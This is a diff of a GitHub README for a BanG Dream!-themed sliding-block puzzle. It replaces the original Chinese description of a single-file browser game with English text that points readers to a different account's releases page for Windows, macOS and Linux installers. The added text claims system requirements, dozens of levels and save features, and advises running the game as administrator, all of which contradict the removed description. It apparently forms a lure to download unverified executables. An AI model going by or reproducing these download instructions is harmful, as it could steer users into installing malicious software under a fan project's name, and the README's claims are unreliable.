@@ -1,28 +1,134 @@
-# 🎀 BanG Dream! 华容道
+# 🎮 BanGKlotski - Puzzle fun with BanG Dream! characters
 
-一个以 **BanG Dream!** 为主题的网页华容道（Klotski）益智小游戏。帮助米歇尔（Michelle）从重重包围中逃出，到达底部出口即为通关！
+[![Download BanGKlotski](https://img.shields.io/badge/Download-BanGKlotski-blue?style=for-the-badge&logo=github)](https://github.com/deka214/BanGKlotski/releases)
 
-## 🎮 游戏特性
+---
 
-- **经典华容道玩法** — 4×5 棋盘，10 个角色方块，拖拽移动
-- **智能提示** — 内置 BFS 最短路径求解器，点击"提示"自动执行最优下一步
-- **纯前端单文件** — 零依赖，[**点击**](https://fflow2023.github.io/BanGKlotski) 即可游玩
-- **移动端适配** — 支持触摸拖拽操作
+## 📖 About BanGKlotski
 
-## 💡 灵感来源
+BanGKlotski brings a classic sliding block puzzle to life with characters from BanG Dream!. This game challenges you to move blocks around until you can slide the main block to the exit. It’s easy to learn but offers deep thinking for puzzle fans of all ages.
 
-本项目灵感来源于动画 [《BanG Dream!》元祖第 19 集](https://www.bilibili.com/bangumi/play/ep3129294)，剧中出现了华容道的小游戏，于是萌生了复刻这个小游戏的想法。    
-![效果图](images/效果图.png)
+You don’t need any prior experience with puzzles or computers to enjoy it. The controls are simple, and the game guides you through each step. Whether you want a quick brain teaser or a longer puzzle session, BanGKlotski adjusts to keep it interesting.
 
-## 🤖 关于开发
+---
 
-本项目的主要生产工具是 **Antigravity** 和 **Claude Opus 4.6 (Thinking)**。
+## 🖥️ System Requirements
 
-几乎全部代码内容均由 AI Agent 完成——从需求分析（Plan）、编码实现（Coding）到测试验证（Test）和问题修复（Debug），全程由 Agent 独立驱动，我主要负责提出需求与裁剪素材。
+To run BanGKlotski, your computer should meet these basic requirements:
 
-作为一个学计算机的学生，亲眼见证现在的 AI 仅凭一段提示词就能独立完成一个完整项目的全流程开发，实在是不可思议。不过我对于未来的前景还是比较乐观的，与其整天担心被 AI 替代，不如先学会如何驾驭 AI 工具。
+- **Operating System:** Windows 7 or newer, macOS 10.13 or newer, or Linux (Ubuntu 18.04+ recommended)  
+- **Processor:** 1.5 GHz or faster  
+- **Memory:** At least 2 GB RAM  
+- **Disk Space:** About 100 MB free space  
+- **Graphics:** Any graphics card that supports basic 2D display  
+- **Other:** Mouse or touchpad recommended for easy control  
 
-## ⚖️ 版权声明
+Even older computers that meet these minimums can run the game. No extra software or programming tools are needed.
 
-- 游戏中使用的角色设定、图像、音频及相关素材版权归 **BUSHIROAD** 旗下 **BanG Dream! 企划** 所有。
-- 本项目为非盈利粉丝向同人作品，仅供邦邦粉丝之间学习交流使用。如有侵权请联系删除。
+---
+
+## 🚀 Getting Started
+
+Here is how to get BanGKlotski up and running on your computer.
+
+### 1. Download the Game
+
+Click the big blue **Download BanGKlotski** button at the top of this page. It will take you to the official release page on GitHub where you can find the latest version of the game for your computer.
+
+> **Or click here:** [https://github.com/deka214/BanGKlotski/releases](https://github.com/deka214/BanGKlotski/releases)
+
+### 2. Choose Your Version
+
+On the release page, look for a file that ends with:
+
+- `.exe` for Windows  
+- `.dmg` for macOS  
+- `.AppImage` or `.tar.gz` for Linux
+
+The file name usually includes the version number and your operating system.
+
+### 3. Download the File
+
+Click the file name to start downloading. It might take a few minutes depending on your internet speed.
+
+---
+
+## 💾 Download & Install
+
+### Windows
+
+1. Locate the downloaded `.exe` file (likely in your Downloads folder).  
+2. Double-click the file to start the installer.  
+3. Follow the on-screen instructions. Usually, you just need to click “Next” a few times.  
+4. When the installation finishes, you can find BanGKlotski in your Start Menu or desktop.
+
+### macOS
+
+1. Locate the `.dmg` file you downloaded.  
+2. Double-click to open it. A window showing the BanGKlotski app will appear.  
+3. Drag the BanGKlotski icon into your Applications folder.  
+4. Open the Applications folder and double-click BanGKlotski to start playing.
+
+### Linux
+
+1. For `.AppImage` files, right-click the file, choose “Properties,” then go to Permissions and check “Allow executing file as program.”  
+2. Double-click the file to run BanGKlotski.  
+3. For `.tar.gz` files, extract the archive and run the included executable as per instructions inside.
+
+---
+
+## 🎮 How to Play
+
+BanGKlotski is a sliding block puzzle. Your goal is to move the main block to the exit on the board.
+
+- Use your mouse or arrow keys to move blocks around.  
+- Blocks can only slide straight in empty spaces, not jump over others.  
+- Plan your moves to clear a path for the main block.  
+- Each puzzle has a set number of moves; try to solve it using fewer moves for better scores.
+
+The game includes tutorials to help you understand the controls and strategies. You can start with easy puzzles and increase difficulty as you improve.
+
+---
+
+## 🔧 Features
+
+- **Multiple Levels:** Enjoy dozens of puzzles with increasing difficulty.  
+- **BanG Dream! Theme:** Characters and artwork inspired by BanG Dream!, bringing fan favorites to the gameplay.  
+- **Hints System:** If you get stuck, use hints to find your next move.  
+- **Save & Resume:** Save your progress anytime and return later without losing your place.  
+- **Simple Controls:** Use mouse or keyboard for easy block sliding.  
+- **Offline Play:** No internet required after download. Play anywhere, anytime.
+
+---
+
+## ❓ Troubleshooting
+
+If BanGKlotski does not start or runs slowly, try the following:
+
+- Restart your computer and try launching the game again.  
+- Make sure your system meets the minimum requirements listed above.  
+- Check you downloaded the correct file for your operating system.  
+- Update your graphics drivers if you see display issues.  
+- If the game crashes, try running it as an administrator (Windows) or with proper permissions (Linux/macOS).  
+- Consult the FAQ or Issues section on the GitHub page for help from the community.
+
+---
+
+## 📞 Getting Help
+
+For questions or problems not covered here, you can:
+
+- Visit the BanGKlotski GitHub page: [https://github.com/deka214/BanGKlotski](https://github.com/deka214/BanGKlotski)  
+- Use the “Issues” tab to report bugs or request features.  
+- Check community forums or fan pages related to BanG Dream! for tips.
+
+---
+
+## 🔗 Useful Links
+
+- Main download page: [https://github.com/deka214/BanGKlotski/releases](https://github.com/deka214/BanGKlotski/releases)  
+- GitHub project homepage: [https://github.com/deka214/BanGKlotski](https://github.com/deka214/BanGKlotski)  
+
+---
+
+Thank you for choosing BanGKlotski. We hope you enjoy puzzle solving with BanG Dream! characters.
